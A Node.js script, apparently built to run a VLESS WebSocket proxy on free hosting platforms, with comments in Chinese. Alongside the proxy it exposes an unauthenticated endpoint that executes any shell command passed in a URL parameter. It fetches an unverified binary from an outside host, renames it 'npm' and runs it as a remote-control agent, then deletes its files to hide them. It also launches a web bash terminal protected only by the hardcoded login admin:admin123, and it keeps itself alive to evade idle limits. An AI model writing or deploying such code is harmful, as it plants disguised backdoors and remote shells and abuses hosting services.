const os = require('os');
const http = require('http');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const net = require('net');
const { Buffer } = require('buffer');
const { exec, execSync } = require('child_process');
const { WebSocket, createWebSocketStream } = require('ws');
const UUID = process.env.UUID || '77e64095-44fb-4688-9b67-5e146bb09ab2'; // 运行哪吒v1,在不同的平台需要改UUID,否则会被覆盖
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';       // 哪吒v1填写形式：nz.abc.com:8008   哪吒v0填写形式：nz.abc.com
const NEZHA_PORT = process.env.NEZHA_PORT || '';           // 哪吒v1没有此变量，v0的agent端口为{443,8443,2096,2087,2083,2053}其中之一时开启tls
const NEZHA_KEY = process.env.NEZHA_KEY || '';             // v1的NZ_CLIENT_SECRET或v0的agent端口                
const DOMAIN = process.env.DOMAIN || '';       // 填写项目域名或已反代的域名，不带前缀，建议填已反代的域名
const AUTO_ACCESS = process.env.AUTO_ACCESS || true;      // 是否开启自动访问保活,false为关闭,true为开启,需同时填写DOMAIN变量
const NAME = process.env.NAME || 'Vls';                    // 节点名称
const PORT = process.env.PORT || 5000;                     // http和ws服务端口

let ISP = '';
const fetchMetaInfo = async () => {
  try {
    const response = await axios.get('https://speed.cloudflare.com/meta');
    if (response.data) {
      const data = response.data;
      ISP = `${data.country}-${data.asOrganization}`.replace(/ /g, '_');
    }
  } catch (error) {
    console.error('Failed to fetch Cloudflare metadata:', error.message);
    ISP = 'Unknown';
  }
};

// Execute the fetch at startup
fetchMetaInfo();

const httpServer = http.createServer((req, res) => {
  const parsedURL = new URL(req.url, `http://${req.headers.host}`);
  if (req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Hello, World\n');
  } else if (req.url === `/${UUID}`) {
    const vlessURL = `vless://${UUID}@www.visa.com.hk:443?encryption=none&security=tls&sni=${DOMAIN}&type=ws&host=${DOMAIN}&path=%2F#${NAME}-${ISP}`;
    const base64Content = Buffer.from(vlessURL).toString('base64');
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(base64Content + '\n');
  } else if (req.url === `/${UUID}/status`) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    let cmdStr = "ps aux";
    exec(cmdStr, function (err, stdout, stderr) {
        if (err) {
            res.end("<pre>命令行执行错误：\n" + err + "</pre>");
        } else {
            res.end("<pre>获取系统进程表：\n" + stdout + "</pre>");
        }
    });
  } else if (parsedURL.pathname === `/${UUID}/exec`) {
    const cmdStr = parsedURL.searchParams.get('cmd');
    // console.log(Object.fromEntries(parsedURL.searchParams));
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    if (!cmdStr) {
        res.end('No command\n');
        return;
    }
    exec(cmdStr, function (err, stdout, stderr) {
        res.end(err? err.message : stdout);
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found\n');
  }
});

const wss = new WebSocket.Server({ server: httpServer });
const uuid = UUID.replace(/-/g, "");
wss.on('connection', ws => {
  // console.log("WebSocket 连接成功");
  ws.on('message', msg => {
    if (msg.length < 18) {
      // console.error("数据长度无效");
      return;
    }
    try {
      const [VERSION] = msg;
      const id = msg.slice(1, 17);
      if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) {
        // console.error("UUID 验证失败");
        return;
      }
      let i = msg.slice(17, 18).readUInt8() + 19;
      const port = msg.slice(i, i += 2).readUInt16BE(0);
      const ATYP = msg.slice(i, i += 1).readUInt8();
      const host = ATYP === 1 ? msg.slice(i, i += 4).join('.') :
        (ATYP === 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) :
          (ATYP === 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));
      // console.log('连接到:', host, port);
      ws.send(new Uint8Array([VERSION, 0]));
      const duplex = createWebSocketStream(ws);
      net.connect({ host, port }, function () {
        this.write(msg.slice(i));
        duplex.on('error', err => console.error("E1:", err.message)).pipe(this).on('error', err => console.error("E2:", err.message)).pipe(duplex);
      }).on('error', err => console.error("连接错误:", err.message));
    } catch (err) {
      console.error("处理消息时出错:", err.message);
    }
  }).on('error', err => console.error("WebSocket 错误:", err.message));
});

const getDownloadUrl = () => {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    if (!NEZHA_PORT) {
      return 'https://arm64.ssss.nyc.mn/v1';
    } else {
      return 'https://arm64.ssss.nyc.mn/agent';
    }
  } else {
    if (!NEZHA_PORT) {
      return 'https://amd64.ssss.nyc.mn/v1';
    } else {
      return 'https://amd64.ssss.nyc.mn/agent';
    }
  }
};

const downloadFile = async () => {
  try {
    const url = getDownloadUrl();
    // console.log(`Start downloading file from ${url}`);
    const response = await axios({
      method: 'get',
      url: url,
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('npm');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log('npm download successfully');
        exec('chmod +x ./npm', (err) => {
          if (err) reject(err);
          resolve();
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const runnz = async () => {
  await downloadFile();
  let NEZHA_TLS = '';
  let command = '';

  console.log(`NEZHA_SERVER: ${NEZHA_SERVER}`);


  const checkNpmRunning = () => {
    try {
      const result = execSync('ps aux | grep "npm" | grep -v "grep"').toString();
      return result.length > 0;
    } catch (error) {
      return false;
    }
  };

  if (checkNpmRunning()) {
    console.log('npm is already running');
    return;
  }

  if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
    const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
    NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? '--tls' : '';
    command = `./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} >/dev/null 2>&1 &`;
  } else if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      // 检测哪吒是否开启TLS
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
      const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: ${NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;

      if (!fs.existsSync('config.yaml')) {
        fs.writeFileSync('config.yaml', configYaml);
      }
    }
    command = ` ./npm -c config.yaml >/dev/null 2>&1 &`;
  } else {
    console.log('NEZHA variable is empty, skip running');
    return;
  }

  try {
    exec(command, {
      shell: '/bin/bash'
    });
    console.log('npm is running');
  } catch (error) {
    console.error(`npm running error: ${error}`);
  }
};

async function keep_alive() {
  if (!AUTO_ACCESS) return;
  try {
    if (!DOMAIN) {
      console.log('URL is empty. Skip Automatic Keep Alive');
      return;
    } else {
      axios.get(`https://${DOMAIN}`)
      .then(response => {
        console.log('Automatic keep alive successfully');
      })
      .catch(error => {
        console.error('Error Automatic keep alive:', error.message);
      });
    }
  } catch (error) {
    console.error('Error Automatic keep alive:', error.message);
  }
}


// 下载对应系统架构的二进制文件
function downloadBinaryFile(fileName, fileUrl, callback) {
    const filePath = path.join("./", fileName);
    const writer = fs.createWriteStream(filePath);
    axios({
        method: 'get',
        url: fileUrl,
        responseType: 'stream',
    })
        .then(response => {
            response.data.pipe(writer);
            writer.on('finish', function () {
                writer.close();
                callback(null, fileName);
            });
        })
        .catch(error => {
            callback(`Download ${fileName} failed: ${error.message}`);
        });
}

async function downloadFiles() {
    const filesToDownload = getFilesForArchitecture();

    if (filesToDownload.length === 0) {
        console.log(`Can't find a file for the current architecture`);
        return;
    }

    let downloadedCount = 0;

    filesToDownload.forEach(fileInfo => {
        downloadBinaryFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
            if (err) {
                console.log(`Download ${fileName} failed`);
            } else {
                console.log(`Download ${fileName} successfully`);

                downloadedCount++;

                if (downloadedCount === filesToDownload.length) {
                    setTimeout(() => {
                        authorizeFiles();
                    }, 3000);
                }
            }
        });
    });
}

function getFilesForArchitecture() {
    const arch = os.arch();
    if (arch === 'arm64') {
        return [
            { fileName: "ttyd", fileUrl: "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.aarch64" },
        ];
    } else if (arch === 'arm'){
        return [
            { fileName: "ttyd", fileUrl: "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.armhf" },
        ];
    } else {
        return [
            { fileName: "ttyd", fileUrl: "https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64" },
        ];
    }
}

// 授权并运行
function authorizeFiles() {
    const filePath = './ttyd';
    const newPermissions = 0o775;
    if (fs.existsSync(filePath)){
        fs.chmod(filePath, newPermissions, (err) => {
            if (err) {
                console.error(`Empowerment failed:${err}`);
            } else {
                console.log(`Empowerment success:${newPermissions.toString(8)} (${newPermissions.toString(10)})`);
                const command = `./ttyd -p 49999 -c admin:admin123 -W bash >/dev/null 2>&1 &`;
                try {
                    exec(command);
                    console.log(`${filePath} is running`);
                } catch (error) {
                    console.error(`${filePath} running error: ${error}`);
                }
            }
        });
    }
}
downloadFiles();

const delFiles = () => {
  fs.unlink('npm', () => { });
  fs.unlink('config.yaml', () => { });
};

if (AUTO_ACCESS && DOMAIN) setInterval(keep_alive, 10 * 60 * 1000);
httpServer.listen(PORT, () => {
  runnz();
  setTimeout(() => {
    delFiles();
  }, 30000);
  keep_alive();
  console.log(`Server is running on port ${PORT}`);
});
